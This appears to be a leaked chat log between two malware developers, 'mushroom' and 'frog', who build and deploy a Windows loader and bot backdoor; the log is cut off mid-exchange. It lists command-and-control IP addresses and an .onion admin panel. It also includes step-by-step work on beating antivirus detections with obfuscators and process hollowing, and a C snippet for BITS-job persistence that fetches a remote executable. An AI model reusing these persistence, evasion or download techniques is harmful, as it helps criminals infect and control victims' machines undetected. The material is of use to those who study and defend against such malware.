+Sent the Bentley kit to Bentley for testing. Uploaded the latest versions of both projects to gitlab.
+
+2020-08-05T12:30:12 mushroom -> frog
+OK.
+
+2020-08-07T10:21:45 mushroom -> frog
+Bentley said that on Win Server 2019 detection happens immediately after reboot with your kit. Dope it so it doesn't happen.
+
+2020-08-07T10:28:20 frog -> mushroom
+Hi. I don't have a Windows Server 2019 machine. Is there any way to connect to this OS remotely?
+
+2020-08-07T10:59:56 mushroom -> frog.
+Ask Bentley.
+
+2020-08-07T11:00:34 mushroom -> frog
+He'll give you access.
+
+2020-08-10T12:19:34 frog -> mushroom
+Hi, what are the ip addresses right now?
+
+2020-08-10T12:24:57 mushroom -> frog
+I don't know yet.
+
+2020-08-11T08:41:16 mushroom -> frog
+If you need more, here are the addresses:
+
+LOADERS
+31.214.240.203
+78.108.216.13
+195.123.240.6
+194.5.249.163
+80.82.68.132
+62.108.35.215
+
+
+bot
+80.82.68.32
+194.5.249.164
+195.123.237.241
+37.220.6.122
+45.148.120.142
+62.109.13.184
+
+2020-08-12T09:44:52 mushroom -> frog
+Hi. So how's it going with Win Server 2019?
+
+2020-08-12T09:51:10 frog -> mushroom
+Hi, I'm working it out for now. Asked Bentley to test it on other cars. On the one he provided, the detects are gone.
+
+2020-08-12T09:51:44 mushroom -> frog
+So you fixed it and gave it to him for testing?
+
+2020-08-12T09:56:40 frog -> mushroom
+Didn't really fix anything there. Figured out what was causing it, and they disappeared on their own. Didn't really change anything except ip addresses. That's why I asked him to test it on other machines.
+
+2020-08-12T09:57:34 mushroom -> frog
+When did you give it to him for testing? Has he written anything yet?
+
+2020-08-12T09:57:54 frog -> mushroom
+Gave it away yesterday. Haven't posted yet.
+
+2020-08-12T09:58:36 mushroom -> frog
+Got it.
+
+2020-08-13T09:35:42 mushroom -> frog
+Hi. Passed the tests of your kit. Made it so you can build with 3 compilers?
+
+2020-08-13T09:37:34 frog -> mushroom
+Hi. Didn't. Started doing it in mingw at the time, had a lot of mistakes. Didn't work right away.
+
+2020-08-13T09:38:03 mushroom -> frog
+Well as long as there's nothing else to do, do it.
+
+2020-08-13T09:38:49 mushroom -> frog
+Clang is already built into Visual Studio, you only need MinGW.
+
+2020-08-13T09:39:43 mushroom -> frog
+As for the kit, we're waiting for Buzu. He'll tell us who to give it to.
+
+2020-08-13T09:40:32 mushroom -> frog
+Keep all experiments in a separate branch now, so as not to spoil the clean working version.
+
+2020-08-13T09:42:10 frog -> mushroom
+Okay
+
+2020-08-14T11:54:21 mushroom -> frog
+Hi. Do a dyncheck test on your last bootloader (which Bentley tested) and send me the link.
+
+2020-08-14T13:55:06 frog -> mushroom
+Hi. This is the 64-bit version:
+https://dyncheck.com/scan/id/d5c95e14a38de0b433faf026dfb29ad6
+
+2020-08-14T13:59:44 mushroom -> frog
+OK. Are there more of them than there used to be?
+
+2020-08-14T14:06:40 mushroom -> frog
+32 bit do it too.
+
+2020-08-14T14:15:54 frog -> mushroom
+Yeah, they've been noticing registrations in the registry since sometime.
+
+2020-08-14T14:16:18 mushroom -> frog
+Clean it up.
+
+2020-08-14T14:22:14 frog -> mushroom
+This test is for 32-bit:
+https://dyncheck.com/scan/id/b726d93392c6a2b6cc301ef71f7f1a5e
+
+2020-08-19T11:18:21 mushroom -> frog
+Hi, did you clean dyncheck the loader's dynamic detects? If you did, send me links to dyncheck.
+
+2020-08-19T11:32:31 frog -> mushroom
+Hi. Haven't cleaned up yet.
+
+2020-08-20T13:14:27 mushroom -> frog
+Hi. How's it going with the detects?
+
+2020-08-20T13:20:58 frog -> mushroom
+Hi. How's it going with the detects?
+
+2020-08-20T14:32:41 frog -> mushroom
+Hi.
+What are the IP addresses right now?
+
+2020-08-20T14:34:45 mushroom -> frog
+lowers
+82.146.37.128
+107.155.137.18
+195.123.240.6
+86.104.194.29
+195.123.241.68
+195.123.241.175
+
+
+bot
+91.200.100.85
+95.171.15.71
+195.123.237.241
+37.220.6.122
+51.89.204.242
+195.123.240.52
+
+2020-08-20T14:35:06 frog -> mushroom
+thanks
+
+2020-08-21T09:06:01 mushroom -> frog
+Hi. Looked at what's in GitLab now
+
+2020-08-21T09:06:16 mushroom -> frog
+The system information works fine.
+
+2020-08-21T09:06:24 mushroom -> frog
+Hollowing does not work.
+
+2020-08-21T09:06:38 mushroom -> frog
+Wrong place to write.
+
+2020-08-21T09:07:01 mushroom -> frog
+Write me when you figure out the detects.
+
+2020-08-21T09:11:15 frog -> mushroom
+Hi. Do you know what the IDP.Generic detector does?
+
+2020-08-21T09:13:25 frog -> mushroom
+It comes and goes with the same file.
+
+2020-08-21T09:16:13 mushroom -> frog
+I don't know. Which antivirus has this?
+
+2020-08-21T09:17:30 frog -> mushroom
+AVG Internet Security and Avast. The 64-bit version detects
+
+2020-08-21T09:21:53 mushroom -> frog
+Is this a static detection?
+
+2020-08-21T09:38:12 frog -> mushroom
+Dynamic
+
+2020-08-21T09:40:01 mushroom -> frog
+Have you tried disabling a piece of software and checking for detects until it goes away?
+
+2020-08-21T09:41:11 mushroom -> frog
+Also see what's in the pictures of detects, there are several detects I know always because of the firewall, they don't count.
+
+2020-08-21T09:41:11 frog -> mushroom
+Sure. It just comes and goes. That's the problem.
+
+2020-08-21T09:47:13 mushroom -> frog
+Without them, how many detects?
+
+2020-08-21T09:47:36 frog -> mushroom
+Without them, how many detects?
+
+2020-08-21T09:53:27 mushroom -> frog
+Without them, how many detects?
+
+2020-08-21T09:53:51 frog -> mushroom
+2 or 3
+
+2020-08-21T09:54:09 mushroom -> frog
+Firewall?
+
+2020-08-21T09:54:28 mushroom -> frog
+Send links.
+
+2020-08-21T09:55:28 frog -> mushroom
+Checked it out yesterday:
+https://dyncheck.com/scan/id/158c99f5d376565a9f8ae2bcb2be65ef
+
+2020-08-21T09:56:50 frog -> mushroom
+Avast installed, I'll try to find out what's wrong
+
+2020-08-21T10:04:08 mushroom -> frog
+It's fine. Comodo always gives detects there, it's some kind of obscure, others are firewall, they don't count.
+
+2020-08-21T10:04:49 mushroom -> frog
+In general, if you can't figure it out, give Bentley this version for testing.
+
+2020-08-24T07:24:38 frog -> mushroom
+Hi. Was dealing with dynamic detects.
+It worked out like this.
+64-bit version:
+https://dyncheck.com/scan/id/2f83b0fde38d24eb44e0ad4dbdbd186c
+32-bit version:
+https://dyncheck.com/scan/id/d7dd896d903a61155799dd9ddc116ab1
+
+2020-08-24T07:29:40 frog -> mushroom
+BitDefender Total Security for some reason shows detection even on an exe-file that does nothing (except ExitProcess immediately on startup).
+Dr Web doesn't know what it wants. Tried to put it on a virtual machine, it didn't ask anything at startup. But the version was something else.
+
+2020-08-24T07:30:47 frog -> mushroom
+Malwarebytes Anti-Malware sometimes asks permission to go online.
+
+2020-08-24T07:33:15 frog -> mushroom
+AVG Internet Security and Avast Internet Security did not like registry registration (IDP.Generic, which I asked about). I fixed it. These antiviruses appear to have the same engine
+
+2020-08-24T07:35:47 frog -> mushroom
+If you had access to a machine with the same DrWeb antivirus, you could try to figure it out.
+
+2020-08-24T07:43:10 mushroom -> frog
+Hi. That worked out well. Give these versions of the Bentley to the tests.
+
+2020-08-24T07:45:12 frog -> mushroom
+Okay. Asked Bentley to run it on a Windows Server 2019 machine. I'll check it just in case, just to make sure it's not like then, and then give it to the tests.
+What are the IP addresses now?
+
+2020-08-24T07:47:34 mushroom -> frog
+lowers
+82.146.37.128
+85.143.221.85
+45.138.158.41
+37.220.6.126
+195.123.241.68
+195.123.241.175
+
+
+bot
+91.200.100.85
+95.171.15.71
+195.123.237.241
+37.220.6.122
+51.89.204.242
+195.123.240.52
+
+2020-08-28T10:10:08 frog -> mushroom
+Hi. Sent Bentley the following kit for testing
+
+2020-08-28T10:24:01 mushroom -> frog
+OK.
+
+2020-08-31T12:34:26 mushroom -> frog
+Hi your group is now a 7 for the battle bot.
+
+2020-08-31T12:34:35 mushroom -> frog
+Make the change.
+
+2020-08-31T12:34:57 mushroom -> frog
+Seven is your test group on the battle server.
+
+2020-08-31T12:35:22 frog -> mushroom
+Hi. Okay
+
+2020-08-31T12:35:57 mushroom -> frog
+7 is a group for work already. You'll use it in the builds you're going to give to work already.
+
+2020-08-31T12:36:41 frog -> mushroom
+You mean use "7" instead of "seven"?
+
+2020-08-31T12:36:58 mushroom -> frog
+For working versions.
+
+2020-08-31T12:37:04 frog -> mushroom
+ How did the last test go?
+
+2020-08-31T12:37:19 mushroom -> frog
+And to test seven.
+
+2020-08-31T12:37:27 mushroom -> frog
+Didn't ask.
+
+2020-08-31T12:37:43 mushroom -> frog
+You have a Bentley, find out.
+
+2020-08-31T12:38:35 mushroom -> frog
+What is your username on the battle server?
+
+2020-08-31T12:38:59 frog -> mushroom
+b16
+
+2020-08-31T12:40:13 mushroom -> frog
+Check access to group 7.
+
+2020-08-31T12:41:58 frog -> mushroom
+A group like this appeared.
+
+2020-08-31T12:42:43 mushroom -> frog
+Check how it works, upload files there and test it.
+
+2020-08-31T12:45:18 mushroom -> frog
+And mark the bot as a test bot to avoid confusion.
+
+2020-08-31T12:48:05 mushroom -> frog
+lowers
+82.146.37.128
+85.143.221.85
+45.138.158.41
+37.220.6.126
+164.132.76.76
+195.123.241.175
+
+
+bot
+91.200.100.85
+212.22.70.4
+194.156.98.46
+37.220.6.122
+51.89.204.242
+195.123.240.52
+
+2020-08-31T12:48:50 mushroom -> frog
+Check when group 7. If all is ok give these battle assemblies with group 7 Bentley.
+
+2020-09-01T13:15:15 mushroom -> frog
+Hi.
+
+2020-09-01T13:15:41 mushroom -> frog
+We give your backdoor to Target.
+
+2020-09-01T13:16:16 frog -> mushroom
+Hi
+
+2020-09-01T13:16:20 mushroom -> frog
+Did you do a combat build for group 7?
+
+2020-09-01T13:16:37 frog -> mushroom
+No, not yet.
+
+2020-09-01T13:17:09 mushroom -> frog
+Do it, give it to Bentley, he'll test it, fix it, and give it to Target for work.
+
+2020-09-01T13:17:27 frog -> mushroom
+Okay
+
+2020-09-01T13:42:23 mushroom -> frog
+Oh, and I forgot to tell you. Now every new build for group 7 increase version of bot and loader, and builds do three compilers MinGW, Clang, MSVC all three have the same version. Then the next day you make a new build, increase the version of all three. For example, today you have 1.5 for all, tomorrow 1.6
+
+2020-09-01T13:44:22 mushroom -> frog
+And update your projects on Gitlab to the latest stable versions you're doing, if you haven't already.
+
+2020-09-01T13:45:51 frog -> mushroom
+There are stable versions out there now. The one now sent for testing is also on gitlab.
+
+2020-09-01T13:46:05 mushroom -> frog
+Just clarifying.
+
+2020-09-01T13:46:45 frog -> mushroom
+That's how I'm increasing the version. Wanted to wait for test results. Bently said he is still testing.
+
+2020-09-01T13:47:28 mushroom -> frog
+For group 7, increase every time you give it away.
+
+2020-09-01T13:47:45 mushroom -> frog
+For group seven however you want, it's a test one.
+
+2020-09-01T13:49:48 frog -> mushroom
+Got it all about the group.
+Clang, MSVC tried to compile, everything is fine. Didn't have time to do MinGW yet, last time I tried to compile it, got lots of errors, didn't have time to fix it yet. And then I wanted to write an obfuscator for system calls. I wanted to debug it and compile it in MinGW.
+
+2020-09-01T13:50:24 mushroom -> frog
+So, do MSVC and Clang for now.
+
+2020-09-01T13:51:30 mushroom -> frog
+By the way, we have a Clang obfuscator, which obfuscates the program a lot.
+
+2020-09-01T13:51:48 mushroom -> frog
+It says so in redmine.
+
+2020-09-01T13:54:21 frog -> mushroom
+Okay, I'll take a look at it.
+I wanted more advice on this. Is it possible to anchor in the system, downloading from the server to do too in mask mode. I.e. not dl7.exe itself did it, but some encrypted executable, which could be unpacked, e.g. from resource file and run in mask mode?
+
+2020-09-01T13:55:15 frog -> mushroom
+Or a PE loader that does the same thing, but in the context of its own process?
+
+2020-09-01T13:55:59 mushroom -> frog
+That's what a crypt does.
+
+2020-09-01T13:56:43 mushroom -> frog
+It's a program that your bootloader is stuffed into, it then takes it out and runs it as Hollowing for example.
+
+2020-09-01T13:56:53 mushroom -> frog
+It's the other person doing it.
+
+2020-09-01T13:57:10 mushroom -> frog
+Bentley gives him your bootloader for that.
+
+2020-09-01T13:57:48 frog -> mushroom
+Ahh... So fighting static detects is just for backup?
+
+2020-09-01T13:57:57 mushroom -> frog
+Yes.
+
+2020-09-01T13:59:09 frog -> mushroom
+Now everything is clearer. Thank you!
+
+2020-09-01T14:02:05 mushroom -> frog
+Add Buzu to your projects as Master. He's on GitLab binman.
+
+2020-09-01T14:02:29 frog -> mushroom
+Okay
+
+2020-09-01T14:02:51 frog -> mushroom
+What's his username?
+
+2020-09-01T14:03:03 frog -> mushroom
+That's it, I got it.
+
+2020-09-01T14:03:03 mushroom -> frog
+binman
+
+2020-09-01T14:07:44 frog -> mushroom
+Added
+
+2020-09-01T14:08:00 mushroom -> frog
+OK.
+
+2020-09-01T15:50:13 mushroom -> frog
+Did you give the Bentley to tests with a group 7 kit?
+
+2020-09-01T15:50:23 mushroom -> frog
+Or seven?
+
+2020-09-01T15:50:38 frog -> mushroom
+seven is still being tested
+
+2020-09-01T15:51:53 frog -> mushroom
+Eliminated dynamic detects, then tested again
+
+2020-09-01T15:52:34 mushroom -> frog
+Make it 7 at once. He will test it.
+
+2020-09-01T15:53:54 mushroom -> frog
+He'll check it and if it's okay he'll give it to you.
+
+2020-09-01T15:55:30 mushroom -> frog
+So don't wait for the tests for seven. Make one for group 7 and give it to Bentley.
+
+2020-09-01T15:55:39 frog -> mushroom
+Okay
+
+2020-09-02T07:44:22 frog -> mushroom
+Hi. Sent Bentley a set with a band "7" for testing.
+
+2020-09-02T07:50:39 mushroom -> frog
+Okay.
+
+2020-09-03T08:48:45 mushroom -> frog
+So how are the group 7 tests going?
+
+2020-09-03T08:50:20 frog -> mushroom
+Hi. Everything went fine.
+
+2020-09-03T08:51:03 mushroom -> frog
+Then now you have to make a new build every day with a version increase and give it to Bentley.
+
+2020-09-03T08:51:31 mushroom -> frog
+With all the compilers you can make at the moment.
+
+2020-09-03T08:51:57 frog -> mushroom
+Got it
+
+2020-09-03T08:52:23 mushroom -> frog
+And while you're at it, finish MinGW.
+
+2020-09-03T08:52:58 frog -> mushroom
+I'm still writing an obfuscator. There is something to do.
+
+2020-09-03T08:55:21 frog -> mushroom
+Is there any way to suppress the "invalid incomplete type" warning in the string obfuscator, do you know?
+
+2020-09-03T08:55:49 mushroom -> frog
+I don't think you can.
+
+2020-09-03T08:56:26 mushroom -> frog
+Since only strings are actually turned into encrypted arrays at compile time.
+
+2020-09-04T08:11:14 mushroom -> frog
+Hi. Addresses.
+Lowaders
+82.146.37.128
+85.143.221.85
+45.138.158.41
+37.220.6.126
+164.132.76.76
+195.123.241.175
+
+
+bot
+93.189.46.41
+212.22.70.4
+194.156.98.46
+81.177.139.38
+54.37.237.253
+195.123.240.52
+
+2020-09-04T08:11:35 mushroom -> frog
+Or does Green send them to you?
+
+2020-09-04T08:32:39 frog -> mushroom
+Hi. No one is sending. Detect one static showed up. I'll figure it out, then I'll send a Bentley set.
+
+2020-09-07T07:10:58 mushroom -> frog
+lowers
+82.146.37.128
+85.143.221.85
+195.123.241.194
+37.220.6.126
+164.132.76.76
+195.123.241.175
+
+
+bot
+93.189.46.41
+212.22.70.4
+194.156.98.46
+81.177.139.38
+54.37.237.253
+185.164.32.107
+
+2020-09-08T13:57:01 frog -> mushroom
+Hi. Bentley said admin has changed, asking to make a new build. I don't understand what needs to be changed in the code?
+
+2020-09-08T13:57:19 mushroom -> frog
+Nothing in the code.
+
+2020-09-08T13:57:38 mushroom -> frog
+The addresses are the same.
+
+2020-09-08T13:58:01 mushroom -> frog
+https://scrytnuuszglaugg.onion:4247/login
+
+2020-09-08T13:58:15 mushroom -> frog
+This is the address for the browser.
+
+2020-09-08T13:59:31 mushroom -> frog
+If your username doesn't fit, write to Booze and he'll give you the password.
+
+2020-09-08T14:00:37 frog -> mushroom
+Are the IP addresses the same today?
+
+2020-09-08T14:02:22 mushroom -> frog
+Yes.
+
+2020-09-09T13:19:01 mushroom -> frog
+Hi. Addresses:
+Lowaders
+82.146.37.128
+85.143.221.85
+195.123.241.194
+37.220.6.126
+164.132.76.76
+195.123.241.175
+
+
+bot
+93.189.46.41
+212.22.70.4
+194.156.98.46
+93.189.40.214
+54.37.237.253
+185.164.32.107
+
+2020-09-09T13:19:12 mushroom -> frog
+Do you do a new build every day?
+
+2020-09-09T13:20:32 frog -> mushroom
+Hi. Did it yesterday. Not yet today. Haven't checked yesterday's Bentley yet.
+
+2020-09-09T13:21:27 mushroom -> frog
+Were there detects or did you change anything?
+
+2020-09-09T13:22:20 frog -> mushroom
+Yes, I did. There were detects.
+
+2020-09-09T13:22:38 mushroom -> frog
+If you just rebuild an already tested version, you don't have to wait for him to test it. Just build it and send it to him, he'll accumulate them to work.
+
+2020-09-09T13:23:03 frog -> mushroom
+Okay.
+
+2020-09-09T13:26:54 mushroom -> frog
+Did they give you a password for the admin area?
+
+2020-09-09T13:27:29 mushroom -> frog
+https://scrytnuuszglaugg.onion:4247/login can you get in here?
+
+2020-09-09T13:28:24 frog -> mushroom
+I wrote to Buse yesterday, asking for a new password.
+I can't log in, old username and password don't work.
+
+2020-09-09T13:28:57 mushroom -> frog
+Boosa apparently didn't notice or the message didn't get through.
+
+2020-09-09T14:53:25 mushroom -> frog
+What's your username?
+
+2020-09-09T14:53:35 frog -> mushroom
+b16
+
+2020-09-09T14:56:48 mushroom -> frog
+Did the message get through?
+
+2020-09-09T14:57:00 frog -> mushroom
+Yes, I'm checking now.
+
+2020-09-09T15:01:35 frog -> mushroom
+Went into the admin area, everything is fine. You asked for a login. Did you write anything else?
+
+2020-09-09T15:01:52 mushroom -> frog
+No.
+
+2020-09-10T15:44:46 frog -> mushroom
+Hi. Should I send a set today? Just have something to fix.
+
+2020-09-10T15:57:35 mushroom -> frog
+Hi. Send every day if it works.
+
+2020-09-14T08:41:07 frog -> mushroom
+Hi. What are the ip addresses today?
+
+2020-09-14T08:43:43 mushroom -> frog
+Hi. Such as:
+loaders
+82.146.37.128
+85.143.221.85
+195.123.241.194
+37.220.6.126
+164.132.76.76
+164.68.107.165
+
+
+bot
+93.189.46.41
+212.22.70.4
+194.156.98.46
+93.189.40.214
+54.37.237.253
+185.164.32.107
+
+2020-09-15T12:07:59 frog -> mushroom
+Hi. Have the IP addresses changed today?
+
+2020-09-15T12:27:06 mushroom -> frog
+Hi. No.
+
+2020-09-16T07:52:17 mushroom -> frog
+Hi.
+lowers
+82.146.37.128
+85.143.221.85
+195.123.241.194
+37.220.6.126
+164.132.76.76
+164.68.107.165
+
+
+bot
+51.89.177.8
+212.22.70.4
+194.156.98.46
+93.189.40.214
+54.37.237.253
+185.164.32.107
+
+2020-09-16T12:11:16 frog -> mushroom
+Hi.
+How do I call the addBitsJob function from the anchorage module to anchor in the system? Do you have an example?
+
+2020-09-16T12:16:36 mushroom -> frog
+Example:
+WCHAR tmpFileName[LCG_RANDOM_IN_RANGE(MAX_PATH + 1, MAX_PATH + 41)];
+    kernel32.getTempPathW(_countof(tmpFileName), tmpFileName);
+    kernel32.getTempFileNameW(tmpFileName, (PCWSTR)L'\0', 0, tmpFileName);
+
+    WCHAR filename[LCG_RANDOM_IN_RANGE(MAX_PATH + 1, MAX_PATH + 41)];
+    if (kernel32.getModuleFileNameW(NULL, filename, _countof(filename))
+    {
+        WCHAR remoteName[LCG_RANDOM_IN_RANGE(30, 30 * 2)];
+        lstrcpyW(remoteName, _WCS(L "https://google.com/update.exe"));
+        WCHAR description[LCG_RANDOM_IN_RANGE(19, 19 * 2)];
+        lstrcpyW(description, _WCS(L "Update maintenance");
+
+        if (!addBitsJob(remoteName, tmpFileName, description, filename/*, NULL*/))
+        {
+            debug_printf(TEXT("Can't add bits copy job\n"))
+        }
+
+2020-09-16T12:17:33 mushroom -> frog
+The point is to give the left address beforehand. Then this system will go to an error state and will constantly call the program we need (the loader).
+
+2020-09-16T12:18:15 mushroom -> frog
+The loader in this case should then return 1. Then the system will always call it until it returns 0.
+
+2020-09-16T12:22:22 frog -> mushroom
+Thank you. I'll look into it.
+
+2020-09-17T14:24:16 frog -> mushroom
+Hi, have the IP addresses changed today?
+
+2020-09-17T14:56:17 mushroom -> frog
+Here:
+loaders
+82.146.37.128
+85.143.221.85
+45.148.10.190
+86.104.194.77
+164.132.76.76
+164.68.107.165
+
+
+bot
+51.89.177.8
+212.22.70.4
+194.156.98.46
+93.189.40.214
+54.37.237.253
+185.164.32.107
+
+2020-09-17T14:56:23 mushroom -> frog
+A little bit of a change.
+
+2020-09-18T11:22:03 mushroom -> frog
+Hi, how are you doing with the detects at the moment?
+
+2020-09-18T12:09:29 frog -> mushroom
+Hi. Been testing the Bentley today. It showed up as a detector. I'm working on it now.
+
+2020-09-18T12:10:14 mushroom -> frog
+What is it called?
+
+2020-09-18T12:11:08 frog -> mushroom
+Trojan:Script/Wacatac.B!ml
+Behavior:Win32/Persistence.GI!ml
+
+2020-09-18T12:11:39 mushroom -> frog
+Behavior:Win32/Persistence.GI!ml is probably because of what you write in the registry.
+
+2020-09-18T12:13:39 frog -> mushroom
+How about removing the registry entry? Leave the creation of the shortcut and the BITS jobs?
+
+2020-09-18T12:15:05 mushroom -> frog
+Try one at a time, what will remove the detector and leave it.
+
+2020-09-18T12:24:22 mushroom -> frog
+What do you have from my code in the loader? I also have Wacatac.
+
+2020-09-18T12:36:11 frog -> mushroom
+Module crypter.
+emercoinResolveDns
+
+2020-09-18T12:55:56 frog -> mushroom
+Localization check.
+Locating in the system.
+Hook removal.
+But all these modules obfuscate in my own way and I've changed them a lot. I rewrote libraryproxy in my own way.
+
+2020-09-18T13:49:00 mushroom -> frog
+Addresses:
+lowaders
+194.5.249.156
+85.143.221.85
+45.148.10.190
+86.104.194.77
+164.132.76.76
+164.68.107.165
+
+
+bot
+51.89.177.8
+212.22.70.4
+194.156.98.46
+93.189.40.214
+54.37.237.253
+185.164.32.107
+
+2020-09-18T15:08:46 frog -> mushroom
+Just to clarify. Is it the exe-file (the loader, I mean) which is launched first, or the one which is downloaded from the server and launched second must also be anchored in the system?
+
+2020-09-18T15:10:04 mushroom -> frog
+One is fixed, if another version happens to be on the server, it is downloaded and run.
+
+2020-09-18T15:10:36 mushroom -> frog
+That is, if a new one is downloaded, the old one is deleted, the new one will already fix itself.
+
+2020-09-18T15:16:02 frog -> mushroom
+And how do I record information about the antivirus? I did so:
+&av=name
+and so:
+&av[1]=name1&av[2]=name2
+But neither the first nor the second method shows me information about the antivirus when I click on "more bot info". Although the command itself has all the information.
+
+2020-09-18T15:19:48 mushroom -> frog
+&av[0]=name1&av[1]=name2&avp[0]=ver1&avp[1]=ver2
+
+2020-09-18T15:19:56 mushroom -> frog
+I have it like this.
+
+2020-09-18T15:21:38 frog -> mushroom
+Thanks
+Buza also said to deal with mitigations and to do a thread start ban. Can I see some example or read about it where?
+
+2020-09-18T15:23:58 mushroom -> frog
+I haven't figured it out yet myself, but I think it's something like this https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-setprocessmitigationpolicy
+
+2020-09-18T15:24:49 frog -> mushroom
+I see, we need to figure it out.
+
+2020-09-18T15:27:36 frog -> mushroom
+What utility can I use to view BITS jobs?
+
+2020-09-18T16:18:18 mushroom -> frog
+bitsadmin /list
+
+2020-09-18T16:18:28 mushroom -> frog
+bitsadmin /list /verbose
+
+2020-09-18T16:18:34 mushroom -> frog
+bitsadmin /reset
+
+2020-09-18T16:18:51 mushroom -> frog
+View, detail, delete assignments.
+
+2020-09-21T17:05:45 mushroom -> frog
+Hi. Now please write me every day with the detects of the loader. And I'll pass it on to Stern.
+
+2020-09-21T17:07:53 frog -> mushroom
+Hi. Now please write me every day with the detects of the loader. And I'll pass it on to Stern.
+
+2020-09-22T09:43:04 mushroom -> frog
+Hi, changes in the commands, the bot appeared command 18, it means to anchor in the system. It turns out the mount must be removed from the loader if you made it and transferred to the bot. It turns out so the loader passes the path to his file in the bot. And the bot if it gets the command 18 uses this path to anchor the loader in the system. Bot still can not save to disk.
+
+2020-09-22T11:47:35 mushroom -> frog
+Hi, changes in the commands, the bot appeared command 18, it means to anchor in the system. It turns out the mount must be removed from the loader if you made it and transferred to the bot. It turns out so the loader sends the path to his file in the bot. And the bot if it receives the command 18 uses this path to fix in the system loader. Bot still can not save to disk.
+
+2020-09-22T11:51:28 frog -> mushroom
+Hi. Okay.
+
+2020-09-22T12:26:00 frog -> mushroom
+Were you able to figure out the cause of the Wacatac detector? I thought it was because of the string obfuscator. When I removed or shortened the obfuscated strings, it disappeared.
+
+2020-09-22T12:27:37 mushroom -> frog
+And just if you make a program with a string obfuscator and a bunch of strings there will be Wacatac?
+
+2020-09-22T12:27:52 mushroom -> frog
+Do you have Wacatac for 32 bit program only?
+
+2020-09-22T12:28:26 mushroom -> frog
+If only for 32 bit, you can score it as long as the 32 bit loader is not used.
+
+2020-09-22T12:28:45 mushroom -> frog
+Need 64 bit only clean.
+
+2020-09-22T12:30:05 mushroom -> frog
+I have Wacatac and DefenseIvasion and it's somewhere in the process of creating ProcessHollowing, as I commented out this function and there were no more detects, I uncommented it appeared.
+
+2020-09-22T12:30:23 mushroom -> frog
+And I only have this for the 64 bit bootloader.
+
+2020-09-22T12:35:56 frog -> mushroom
+I have it in the 32-bit version. Just did not try to make a program with obfuscator, but once tried to make a long line at the beginning of main function, and commented out all the other modules. So this detector didn't disappear until I deleted this line, although about 80% of the code wasn't there anymore. I also noticed that it disappeared when I commented out or shortened long lines with a list of emercoin addresses and function with lots of dll library names.
+
+2020-09-22T12:40:50 frog -> mushroom
+The obfuscator inserts a sequence of MOV calls into the code, if you look in the "Disassembled Code" window.
+Maybe antivirus doesn't like it, although there's nothing illegal about it. They are just local variables, in fact.
+
+2020-09-22T12:42:58 frog -> mushroom
+Similar situation was with Fugrafa detection by BullGuard antivirus. If you comment out the obfuscator, it disappears.
+
+2020-09-22T12:43:45 mushroom -> frog
+What is the obfuscator?
+
+2020-09-22T12:44:28 frog -> mushroom
+The same one you gave me: strobfuscator.h
+
+2020-09-22T12:47:08 mushroom -> frog
+Try this one:
+Download: https://qaz.im/load/zY7BSQ/fEdaH8
+Delete: https://qaz.im/index.php?a=delete&q=2095202804
+Password: :PV1[A<8#hC3YLWZX
+
+2020-09-22T12:47:46 mushroom -> frog
+The first character in the password is ":"
+
+2020-09-22T12:48:08 mushroom -> frog
+":PV1[A<8#hC3YLWZX
+
+2020-09-22T12:49:00 mushroom -> frog
+At the beginning of the file you write:
+#ifdef OBFUSCATED_STRINGS
+#include "MetaString4.h"
+using namespace andrivet::ADVobfuscator;
+#endif
+
+2020-09-22T12:49:11 mushroom -> frog
+_STR also works there
+
+2020-09-22T12:49:23 mushroom -> frog
+It just doesn't obfuscate unicode strings.
+
+2020-09-22T12:52:04 frog -> mushroom
+Thanks
+
+2020-09-22T12:53:18 mushroom -> frog
+Then tell me the result. If so, I'll refine stdobfuscator (put in extra obfuscation methods from this obfuscator, there's only one right now.
+
+2020-09-22T13:03:34 mushroom -> frog
+Do you do the holoving as I sent the code?
+
+2020-09-22T13:04:11 mushroom -> frog
+I've changed it now and the Wacatc and DefenseIvasion detectors don't show up.
+
+2020-09-22T13:06:09 frog -> mushroom
+It's a little different for me. Technically it's the same, but the implementation is different. I used the one Buza gave me and reworked it for the 64-bit version.
+
+2020-09-24T11:34:41 mushroom -> frog
+Hi.
+
+2020-09-24T11:34:43 mushroom -> frog
+lowers
+195.123.237.91
+45.143.136.209
+91.235.129.64
+92.242.40.137
+91.235.129.64
+92.242.40.137
+
+bot
+88.150.197.173
+185.113.140.186
+194.87.232.53
+104.149.170.182
+185.17.123.63
+45.138.158.35
+
+2020-09-24T11:35:00 mushroom -> frog
+Are there detects on the x64 loader?
+
+2020-09-24T13:14:03 frog -> mushroom
+Hi. Fixing in the system inside the bot is still being done.
+
+2020-09-24T13:14:38 frog -> mushroom
+There were no detects on the 64-bit version
+
+2020-09-24T13:27:16 frog -> mushroom
+Hi. Fixing in the system inside the bot is still being done.
+
+2020-09-24T13:27:16 frog -> mushroom
+There were no detects on the 64-bit version
+
+2020-09-24T13:28:18 mushroom -> frog
+x86 is not needed. Give up the stable x64 version of Bentley.
+
+2020-09-24T13:36:32 mushroom -> frog
+Well, every day, give him the stable set. And then do all sorts of tweaks in the other branch, then merge it into the stable one.
+
+2020-09-24T13:45:24 mushroom -> frog
+I dug up a library that lets you not use msvcruntime http://www.malsmith.net/minicrt/
+
+2020-09-24T13:45:48 mushroom -> frog
+I have a 7x smaller bootloader.
+
+2020-09-24T13:46:59 mushroom -> frog
+I also dug out a program that will quickly obfuscate the timeline if needed https://www.codeproject.com/Articles/1210398/TinyObfuscate-A-small-String-Obfuscator
+
+2020-09-24T13:48:33 frog -> mushroom
+Thank you. I'll take a look at
+
+2020-09-24T14:02:44 frog -> mushroom
+I wanted to ask about the update. If you need to update the bootloader, should you delete the old bootloader and save the new one under the name of the old one?
+
+2020-09-24T14:03:29 mushroom -> frog
+Delete the old one, download and run the new one.
+
+2020-09-24T14:04:30 mushroom -> frog
+Same as command 10 with save to disk, only at the beginning you have to remove the old bootloader.
+
+2020-09-24T14:04:58 mushroom -> frog
+That is, when the loader starts the bot, it must pass it its filename.
+
+2020-09-24T14:05:15 mushroom -> frog
+Then you can easily remove it from the bot on command.
+
+2020-09-24T14:07:49 frog -> mushroom
+Are the loaders originally saved to the Temp folder? Or another one?
+
+2020-09-24T14:08:29 mushroom -> frog
+What does that originally mean?
+
+2020-09-24T14:08:52 mushroom -> frog
+When do you download?
+
+2020-09-24T14:09:05 frog -> mushroom
+Before the very first run
+
+2020-09-24T14:09:27 mushroom -> frog
+It's not known. The user can download anywhere.
+
+2020-09-24T14:10:11 mushroom -> frog
+You can get your own name by GetModuleHandleFileName
+
+2020-09-24T14:10:35 mushroom -> frog
